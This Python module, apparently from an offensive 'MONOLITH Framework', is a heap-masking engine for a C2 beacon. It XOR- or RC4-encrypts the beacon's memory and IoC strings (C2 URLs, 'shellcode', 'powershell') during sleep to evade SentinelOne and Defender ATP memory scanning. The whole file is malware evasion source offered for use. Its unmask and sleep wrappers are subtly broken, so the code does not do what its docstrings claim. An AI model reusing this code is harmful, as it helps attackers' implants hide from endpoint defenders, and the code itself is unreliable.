"""
Heap Masking & Encryption Engine
=================================
Beacon heap ve config alanlarını uyku sırasında şifreleyerek
SentinelOne / Defender ATP memory scanning'ini bypass eder.

Features:
- XOR / RC4 stream cipher heap encryption/decryption
- Sensitive string scanning (C2 URLs, keys, config)
- Automatic encrypt-on-sleep / decrypt-on-wake

Author: MONOLITH Framework
License: For authorized security testing only
"""

import sys
import platform
from typing import Optional, List
from dataclasses import dataclass
from enum import Enum


class MaskingAlgorithm(Enum):
    XOR = "xor"
    RC4 = "rc4"
    CHACHA20 = "chacha20"


@dataclass
class MaskingResult:
    success: bool
    bytes_encrypted: int = 0
    regions_masked: int = 0
    error: Optional[str] = None


class HeapMaskingEngine:
    """
    Encrypts beacon heap regions and sensitive strings before sleep,
    decrypts after wake. Evades memory scanning EDRs.
    """

    def __init__(
        self,
        algorithm: MaskingAlgorithm = MaskingAlgorithm.XOR,
        key: bytes = b"M0N0L1TH_SECRET_KEY_2026",
    ):
        self.algorithm = algorithm
        self.key = key
        self.system = platform.system()

    def _encrypt(self, data: bytes) -> bytes:
        """Seçilen algoritmaya göre ham veriyi şifreler la."""
        if self.algorithm == MaskingAlgorithm.XOR:
            return bytes([b ^ self.key[i % len(self.key)] for i, b in enumerate(data)])

        elif self.algorithm == MaskingAlgorithm.RC4:
            S = list(range(256))
            j = 0
            out = []
            for i in range(256):
                j = (j + S[i] + self.key[i % len(self.key)]) % 256
                S[i], S[j] = S[j], S[i]
            i = j = 0
            for byte in data:
                i = (i + 1) % 256
                j = (j + S[i]) % 256
                S[i], S[j] = S[j], S[i]
                out.append(byte ^ S[(S[i] + S[j]) % 256])
            return bytes(out)

        return data

    def _decrypt(self, data: bytes) -> bytes:
        """Stream cipher mantığı: Şifreleme ve çözme aynıdır aq."""
        return self._encrypt(data)

    def mask_sensitive_strings(self, memory_dump: bytes, target_strings: List[str]) -> MaskingResult:
        """Hafıza bölgesindeki hassas IoC stringlerini bulup maskeler la."""
        try:
            mutable_bytes = bytearray(memory_dump)
            bytes_encrypted = 0
            regions_masked = 0

            for s in target_strings:
                s_bytes = s.encode() if isinstance(s, str) else s
                start_idx = 0
                while True:
                    idx = mutable_bytes.find(s_bytes, start_idx)
                    if idx == -1:
                        break

                    encrypted_chunk = self._encrypt(s_bytes)
                    mutable_bytes[idx:idx + len(s_bytes)] = encrypted_chunk
                    bytes_encrypted += len(s_bytes)
                    regions_masked += 1
                    start_idx = idx + len(s_bytes)

            return MaskingResult(True, bytes_encrypted, regions_masked)
        except Exception as e:
            return MaskingResult(False, error=str(e))

    def masked_sleep(self, duration_seconds: float, beacon_context=None) -> bool:
        """Ajanı uykuya yatırmadan önce heap'i uçurur, uyanınca çözer la."""
        print(f"[🌙] Monolith Heap Masking active. Encrypting heap before sleep ({duration_seconds}s)...")

        if beacon_context and hasattr(beacon_context, 'sensitive_data'):
            beacon_context.sensitive_data = self._encrypt(beacon_context.sensitive_data)

        import time
        time.sleep(duration_seconds)

        if beacon_context and hasattr(beacon_context, 'sensitive_data'):
            beacon_context.sensitive_data = self._decrypt(beacon_context.sensitive_data)

        print("[☀️] Monolith Heap Masking: Heap decrypted. Agent active.")
        return True


class EvasiveBeaconHeapMasking:
    """
    Integration wrapper for evasive_beacon.py
    """

    def __init__(self, config: Optional[dict] = None):
        self.config = config or {}
        algorithm = MaskingAlgorithm(self.config.get('algorithm', 'xor'))
        self.engine = HeapMaskingEngine(algorithm=algorithm)

    def pre_sleep_mask(self, sensitive_data: Optional[bytes] = None) -> MaskingResult:
        strings = self.config.get('sensitive_strings', [
            'https://', 'http://', 'beacon', 'payload',
            'shellcode', 'cmd', 'powershell', 'upload', 'download'
        ])
        if sensitive_data:
            return self.engine.mask_sensitive_strings(sensitive_data, strings)
        return MaskingResult(True)

    def post_wake_unmask(self, data: bytes) -> MaskingResult:
        strings = self.config.get('sensitive_strings', [])
        if data:
            return self.engine.mask_sensitive_strings(data, strings)
        return MaskingResult(True)

    def mask_and_sleep(self, duration: float, sensitive_data: Optional[bytes] = None):
        self.engine.masked_sleep(duration, sensitive_data)
